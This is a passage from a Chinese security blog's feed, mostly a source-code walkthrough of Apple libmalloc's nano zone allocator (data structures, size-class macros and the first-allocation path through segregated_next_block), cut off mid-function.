<p>而两个利用本质上面的不同是对<code>mach port</code>的不同的利用方法。下面主要结合两个不同的POC，来分析一下<code>mach message</code>的使用，同时也是研究<code>xnu</code>的<code>IPC</code>的基础。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmalloc源码分析之nanozone_s的处理]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bnanozone-s%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://turingh.github.io/2016/06/28/libmalloc源码分析之nanozone-s的处理/</id>
    <published>2016-06-29T02:11:53.000Z</published>
    <updated>2016-06-30T02:58:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="摘要">摘要</h1><p>根据申请内存的大小不同，<code>libmalloc</code>会从不同的堆上空间将内存分配给申请者，而最小的一个一档，是从<code>nano_zone_s</code>中，通过<code>nano_*</code>函数获取堆上已分配的内存。</p>
<a id="more"></a>
<h1 id="nano_zone_s">nano_zone_s</h1><p><code>nano_zone_s</code>的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>在<a href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/#szone_t、nanozone_t">libmalloc源码分析之初始化</a>中做过简单的介绍，这个数据结构中，主要需要理解的是几个宏和一个数据结构。</p>
<h2 id="一些需要理解的宏定义">一些需要理解的宏定义</h2><h3 id="NANO_MAX_SIZE">NANO_MAX_SIZE</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hexcolor">#def</span>ine NANO_MAX_SIZE			<span class="number">256</span> </span><br><span class="line"><span class="comment">/* Buckets sized &#123;16, 32, 48, 64, 80, 96, 112, ...&#125; */</span></span><br></pre></td></tr></table></figure>
<p>定义了<code>nano_zone</code>中可以申请的内存块的最大值为256</p>
<h3 id="SLOT_IN_BAND_SIZE">SLOT_IN_BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SLOT_IN_BAND_SIZE 	(<span class="number">1</span> &lt;&lt; NANO_OFFSET_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>SLOT_IN_BAND_SIZE</code>的值为2^17==128*1024,所以<code>SLOT_IN_BAND_SIZE</code>的值等于<code>128KB</code>。用来表示，在每一个<code>nano</code>内存分配的<code>BAND</code>之中，一个每一个<code>SLOT</code>的大小是<code>128KB</code>。</p>
<h3 id="BAND_SIZE">BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> BAND_SIZE 		(<span class="number">1</span> &lt;&lt; (NANO_SLOT_BITS + NANO_OFFSET_BITS)) </span></span><br><span class="line"><span class="comment">/*  == Number of bytes covered by a page table entry */</span></span><br></pre></td></tr></table></figure>
<p><code>BAND_SIZE</code>的值为2^21==2*1024*1024,所以<code>BAND_SIZE</code>的值等于<code>2MB</code>。用来表示，在每一个<code>nano_zone_t</code>的分配中，每一个BAND的大小是2MB。</p>
<h3 id="NANO_MAG_SIZE">NANO_MAG_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_BITS            <span class="number">5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_SIZE            (<span class="number">1</span> &lt;&lt; NANO_MAG_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>NANO_MAG_SIZE</code>的值为2^5==32，用来最多支持多少个核。</p>
<h3 id="NANO_SLOT_SIZE">NANO_SLOT_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_SIZE      	(<span class="number">1</span> &lt;&lt; NANO_SLOT_BITS)</span></span><br></pre></td></tr></table></figure>
<p>表示一共有2^4,也就是16种<code>SLOT</code>的大小。分别是16,32,48,64,…,256。</p>
<h2 id="nano_meta_s">nano_meta_s</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nano_meta_s &#123;</span><br><span class="line">	OSQueueHead			slot_LIFO CACHE_ALIGN;</span><br><span class="line">  	<span class="comment">//用于重复利用释放内存的队列</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_madvised_log_page_count;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_current_base_addr;</span><br><span class="line">  	<span class="comment">//slot的基址</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_limit_addr;</span><br><span class="line">  	<span class="comment">//slot可以分配的地址最大值</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_mapped;</span><br><span class="line">  	<span class="comment">//slot中已经映射了多少个objects</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_skipped;</span><br><span class="line">  	<span class="comment">//slot开始的时候会跳过多少个object开始使用</span></span><br><span class="line">	<span class="keyword">bitarray_t</span>			slot_madvised_pages;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_bump_addr CACHE_ALIGN; </span><br><span class="line">  	<span class="comment">//slot当前开始分配的地址</span></span><br><span class="line">    <span class="comment">// position on cache line distinct from that of slot_LIFO</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">boolean_t</span>		slot_exhausted;</span><br><span class="line">  	<span class="comment">// slot是否已经用尽</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_bytes;</span><br><span class="line">  	<span class="comment">// 该slot中存储的bytes是多少(16、32、48...)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_objects;</span><br><span class="line">  	<span class="comment">// 该slot中存储了多少个object(slot总内存/slot_bytes)</span></span><br><span class="line">&#125; *<span class="keyword">nano_meta_admin_t</span>;</span><br></pre></td></tr></table></figure>
<p>这个数据结构就是<code>nano_zone_s</code>中的<code>meta_data</code>的数据结构，具体用来描述每一个<code>slot</code>的状态和属性。</p>
<h1 id="nano_malloc">nano_malloc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc_zone_malloc</span><span class="params">(malloc_zone_t *zone, size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*ptr;</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	ptr = zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line"><span class="title">nano_malloc</span><span class="params">(nanozone_t *nanozone, size_t size)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= NANO_MAX_SIZE) &#123;</span><br><span class="line">		<span class="keyword">void</span> *p = _nano_malloc_check_clear(nanozone, size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* FALLTHROUGH to helper zone */</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">malloc_zone_t</span> *zone = (<span class="keyword">malloc_zone_t</span> *)(nanozone-&gt;helper_zone);</span><br><span class="line">	<span class="keyword">return</span> zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为默认的<code>zone</code>是使用<code>nano_zone_t</code>，在<code>malloc_zone_malloc</code>中的<code>zone-&gt;malloc()</code>函数被调用之后，在</p>
<p><code>nano_malloc</code>会依据申请的size进行判断，当只有当<code>size</code>小于<code>NANO_MAX_SIZE</code>的时候才会调用<code>nano_malloc</code>的内部实现<code>_nano_malloc_check_clear</code>，否则就通过<code>nanozone-&gt;helper_zone</code>的<code>malloc</code>函数，进一步判断使用<code>tiny</code>、<code>small</code>、还是<code>large</code>。</p>
<h3 id="第一次调用_nano_malloc_check_clear">第一次调用_nano_malloc_check_clear</h3><p>所以需要重点分析的函数是<code>_nano_malloc_check_clear</code>。而第一次调用<code>malloc</code>的话，主要流程在<code>segregated_next_block</code>中实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> </span><br><span class="line">_nano_malloc_check_clear(<span class="keyword">nanozone_t</span> *nanozone, <span class="keyword">size_t</span> size, <span class="keyword">boolean_t</span> cleared_requested)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span>		*ptr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_key;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_bytes = segregated_size_to_fit(nanozone, size, &amp;slot_key); <span class="comment">// Note slot_key is set here</span></span><br><span class="line">	<span class="comment">//SLOT_BYTES是固定的16、32、64、128、、、、</span></span><br><span class="line">	<span class="comment">//slot_key 1~16</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	mag_index = NANO_MAG_INDEX(nanozone);</span><br><span class="line">	<span class="comment">//获取cpu对应的index</span></span><br><span class="line">  </span><br><span class="line">	<span class="comment">//选择cpu以及对应的内存大小块</span></span><br><span class="line">	<span class="keyword">nano_meta_admin_t</span>	pMeta = &amp;(nanozone-&gt;meta_data[mag_index][slot_key]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//检测是否存在已经释放过，可以直接拿来用的内存</span></span><br><span class="line">	ptr = OSAtomicDequeue( &amp;(pMeta-&gt;slot_LIFO), offsetof(<span class="keyword">struct</span> chained_block_s,next));</span><br><span class="line">	<span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">      	<span class="comment">//如果队列中存在函数，则直接使用队列中的数据</span></span><br><span class="line">      	<span class="comment">//第一次调用malloc时，不会执行这一块代码，所以后面再另做分析</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//没有释放过的内存，所以调用函数 获取内存</span></span><br><span class="line">		ptr = segregated_next_block(nanozone, pMeta, slot_bytes, mag_index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cleared_requested &amp;&amp; ptr)</span><br><span class="line">		<span class="built_in">memset</span>(ptr, <span class="number">0</span>, slot_bytes); <span class="comment">// <span class="doctag">TODO:</span> Needs a memory barrier after memset to ensure zeroes land first?</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="segregated_size_to_fit">segregated_size_to_fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">input : size = 0 </span><br><span class="line">size = NANO_REGIME_QUANTA_SIZE==&gt;(1&lt;&lt;4)==&gt;2^4==&gt;16</span><br><span class="line">k = (16 + 16 - 1) &gt;&gt; 4 ==&gt; 31&gt;&gt;4 ==&gt; 1</span><br><span class="line">slot_bytes = 1 &lt;&lt; 4 ==&gt; 16</span><br><span class="line">*pkey = 0 </span><br><span class="line"></span><br><span class="line">input : size = 16 </span><br><span class="line">size = 16</span><br><span class="line">k = (16+16-1) &gt;&gt; 4 ==&gt;1</span><br><span class="line">slot_bytes = 16</span><br><span class="line">*pkey = 0</span><br><span class="line"></span><br><span class="line">input : size = 32</span><br><span class="line">size : 32</span><br><span class="line">k = (32+16-1)&gt;&gt;4 ==&gt;2</span><br><span class="line">slot_bytes = 2&lt;&lt;4 = 32</span><br><span class="line">*pkey = 2-1 ==&gt;1</span><br><span class="line"></span><br><span class="line">0~16 :</span><br><span class="line">pkey ==&gt; 0</span><br><span class="line">slot_bytes ==&gt; 16B</span><br><span class="line"></span><br><span class="line">17~32</span><br><span class="line">pkey ==&gt; 1</span><br><span class="line">slot_bytes ==&gt; 32B</span><br><span class="line"></span><br><span class="line">256</span><br><span class="line">pkey ==&gt; 16</span><br><span class="line">slot_bytes ==&gt; 256B</span><br><span class="line">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">segregated_size_to_fit</span><span class="params">(nanozone_t *nanozone, size_t size, <span class="keyword">unsigned</span> <span class="keyword">int</span> *pKey)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k, slot_bytes;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == size)</span><br><span class="line">		size = NANO_REGIME_QUANTA_SIZE; <span class="comment">// Historical behavior</span></span><br><span class="line"></span><br><span class="line">	k = (size + NANO_REGIME_QUANTA_SIZE - <span class="number">1</span>) &gt;&gt; SHIFT_NANO_QUANTUM; <span class="comment">// round up and shift for number of quanta</span></span><br><span class="line">	slot_bytes = k &lt;&lt; SHIFT_NANO_QUANTUM; <span class="comment">// multiply by power of two quanta size</span></span><br><span class="line">	*pKey = k - <span class="number">1</span>; <span class="comment">// Zero-based!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slot_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数实现的功能是根据申请的<code>size</code>大小，计算到相应的需要申请的相应的slot_bytes。例如申请的大小是20的话，<code>slot_bytes</code>就应当是32。</p>
<h4 id="初见segregated_next_block">初见segregated_next_block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">void</span> *</span><br><span class="line"><span class="title">segregated_next_block</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> theLimit = pMeta-&gt;slot_limit_addr; <span class="comment">// Capture the slot limit that bounds slot_bump_addr right now</span></span><br><span class="line">		<span class="comment">//pMeta-&gt;slot_limit_addr</span></span><br><span class="line">		<span class="comment">//当前这块pMeta可用内存的结束地址。</span></span><br><span class="line">		<span class="keyword">uintptr_t</span> b = OSAtomicAdd64Barrier(slot_bytes, (<span class="keyword">volatile</span> <span class="keyword">int64_t</span> *)&amp;(pMeta-&gt;slot_bump_addr));</span><br><span class="line">		<span class="comment">//原子的为pMeta-&gt;slot_bump_addr添加slot_bytes的长度，偏移到下一个地址</span></span><br><span class="line">		b -= slot_bytes; <span class="comment">// Atomic op returned addr of *next* free block. Subtract to get addr for *this* allocation.</span></span><br><span class="line">		<span class="comment">//减去添加的偏移量，获取当前可以获取的地址</span></span><br><span class="line">		<span class="keyword">if</span> (b &lt; theLimit) &#123; <span class="comment">// Did we stay within the bound of the present slot allocation?</span></span><br><span class="line">			<span class="comment">//如果地址还在范围之内，则返回地址</span></span><br><span class="line">			<span class="comment">//<span class="doctag">todo:</span>b不仅小于thelimit且远远小于thelimit，就可以获取一个就指向其他内存块的地址了。</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">void</span> *)b; <span class="comment">// Yep, so the slot_bump_addr this thread incremented is good to go</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123; <span class="comment">// exhausted all the bands availble for this slot?</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// We're toast</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// One thread will grow the heap, others will see its been grown and retry allocation</span></span><br><span class="line">				_malloc_lock_lock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">				<span class="comment">// re-check state now that we've taken the lock</span></span><br><span class="line">				<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Toast</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; pMeta-&gt;slot_limit_addr) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot was successfully grown by first-taker (not us). Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot has been successfully grown by us. Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					pMeta-&gt;slot_exhausted = TRUE;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为是第一次调用<code>segregated_next_block</code>函数，<code>theLimit</code>的值为0，<code>b</code>的值也为0。</p>
<p>又因为<code>pMeta-&gt;slot_exhausted</code>的值也是0，且<code>pMeta-&gt;slot_limit_addr</code>的值也为0，所以会调用</p>
<p><code>segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)</code>。</p>
<p>该函数的实现非常的有<strong>技巧</strong>性，所以不只有<strong>初始化</strong><code>nano_zone</code>中<code>band</code>的功能，在后面的分析还会遇到，遇到之后再做详细分析。</p>
<h4 id="获得第一个BAND">获得第一个BAND</h4><p><code>segregated_band_grow</code>函数实现了2个功能。</p>
<ul>
<li><code>BAND</code>用尽后的增长</li>
<li>以及一个特殊情况，创建第一个<code>BAND</code></li>
</ul>
<h5 id="什么是BAND">什么是BAND</h5><p>每一个<code>BAND</code>的大小为2MB，是<code>nano_zone_t</code>向堆申请内存的单位，每一个独立的cpu每次申请一个<code>BAND</code>，当一个<code>BAND</code>用完之后，会再申请一个<code>BAND</code>。每一个cpu的<code>BAND</code>是分开使用的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> boolean_t</span><br><span class="line"><span class="title">segregated_band_grow</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">nano_blk_addr_t</span> u; <span class="comment">// the compiler holds this in a register</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> p, s;</span><br><span class="line">	<span class="keyword">size_t</span> watermark, hiwater;</span><br><span 